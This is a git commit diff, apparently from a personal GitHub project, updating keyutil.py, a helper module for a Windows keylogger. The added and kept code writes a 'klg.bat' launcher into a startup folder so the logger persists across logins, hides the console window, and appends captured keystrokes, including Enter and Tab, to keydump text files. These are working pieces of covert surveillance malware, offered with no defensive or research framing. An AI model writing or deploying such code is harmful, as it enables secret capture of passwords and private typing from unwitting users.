90e996ab450119074353780db42cc1f90d136f8f
Andrew Lim <69717344+andr-w@users.noreply.github.com>
2024-05-09 14:40:05 +0800

    Updated keyutil.py

--- keyutil.py
+++ keyutil.py
@@ -1,37 +1,67 @@
 import os
 import win32gui, win32con, win32console
+from datetime import time, date
+
 global count
-# newdir = 
 
 def newbat(thispath, pypath, startup):
-    with open(os.path.join(startup,"klg.bat"), "x") as file:
-        file.write("@echo off\n")
-        file.write(f"{pypath} {thispath}")
+    try:
+        with open(os.path.join(startup,"klg.bat"), "x") as file:
+            file.write("@echo off\n")
+            file.write(f"{pypath} {thispath}")
+    except FileExistsError:
+        return
 
 def hidecmd():
     cwindow = win32console.GetConsoleWindow()
     win32gui.ShowWindow(cwindow, win32con.SW_HIDE)
 
-def showwindow():
-    cwindow = win32console.GetConsoleWindow()
-    win32gui.ShowWindow(cwindow, win32con.SW_SHOW)
-
-def createlog(applocal, logname):
+def createfolder(folderdir):
     try:
-        open(os.path.join(applocal, logname), "x")
+        os.makedirs(folderdir)
     except FileExistsError:
-        newdumpname = f"keydump({count}).txt"
-        createlog(applocal, newdumpname)
+        return
 
-def updatelog(applocal, logname, dumptxt):
+def createlog(folderdir, logname):
     try:
-        with open(os.path.join(applocal,"keydump.txt"), "a") as file:
-            file.write(dumptxt + "\n")
+        open(os.path.join(folderdir, logname), "x")
+    except FileExistsError:
+        newdumpname = f"keydump({filecount(folderdir)}).txt"
+        createlog(folderdir, newdumpname)
+
+
+def updatelog(folderdir, logname, dumptxt):
+    try:
+        with open(os.path.join(folderdir, logname), "a") as file:
+            match dumptxt:
+                case "space":
+                    file.write(" ")
+                case "enter":
+                    file.write(" [Enter] ")
+                case "tab":
+                    file.write(" [Tab] ")
+            try:
+                if ord(dumptxt) >= 32 and ord(dumptxt) <= 127:
+                    file.write(dumptxt)  
+            except TypeError:
+                return
+            
     except FileNotFoundError:
-        createlog(applocal, logname)
+        createlog(folderdir, logname)
 
-# def checklogcount(applocal):
-    # return count
+def filecount(folderdir):
+    count = 0
+    for files in os.listdir(folderdir):
+        if files.endswith(".txt"):
+            count += 1
+    return count
 
+def latestlog(count):
+    if count == 0:
+        return f"keydump.txt"
+    return f"keydump{count}.txt"
 
+def OnKeyboardEvent(folderdir, logname, dumptxt):
+    updatelog(folderdir, logname, dumptxt)
+    return
 
